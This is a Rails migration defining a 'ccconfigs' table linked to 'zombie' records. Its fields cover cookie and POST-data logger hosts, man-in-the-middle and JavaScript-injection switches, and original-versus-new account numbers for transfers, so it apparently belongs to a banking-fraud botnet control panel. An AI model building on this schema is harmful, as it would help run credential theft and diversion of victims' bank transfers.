class CreateCcconfigs < ActiveRecord::Migration
  def change
    create_table :ccconfigs do |t|
      t.string :balancepage
      t.boolean :checksslvar
	  t.string :loginhost
      t.string :cookieloggerhost
      t.boolean :cookieloggingenabled
      t.boolean :enablemitm
      t.integer :jscommandid
      t.string :jscommand
      t.string :logoutpostdata
      t.string :modifyurl
      t.string :myaccount
      t.string :newaccount
      t.string :origaccount
      t.string :origmsg
      t.string :postdataloggerhost
      t.boolean :postenabled
      t.string :cookielist
      t.string :transferurl
      t.string :uploadpath
      t.references :zombie

      t.timestamps
    end
    add_index :ccconfigs, :zombie_id
  end
end
